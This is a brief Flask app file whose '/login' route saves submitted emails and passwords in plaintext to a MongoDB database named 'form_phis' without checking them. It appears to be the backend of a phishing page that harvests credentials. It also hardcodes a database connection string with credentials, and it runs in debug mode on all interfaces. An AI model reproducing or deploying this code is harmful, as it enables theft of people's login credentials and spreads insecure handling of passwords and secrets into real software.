# app.py.
from flask import Flask, request, render_template, jsonify
from pymongo import MongoClient

client = MongoClient('mongodb+srv://test:123@cluster0.h4ps7.mongodb.net/')
db = client.form_phis
app = Flask(__name__)

@app.route('/')
def main():
   return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('give_email')
    password = request.form.get('give_password')

    doc = {
        'email': email,
        'password': password
    }
    db.formDatas.insert_one(doc)
    return jsonify({'msg':'Data Success Save!'})

    # Here you would typically check the credentials against a database


if __name__ == '__main__':
   app.run('0.0.0.0', port=5000, debug=True)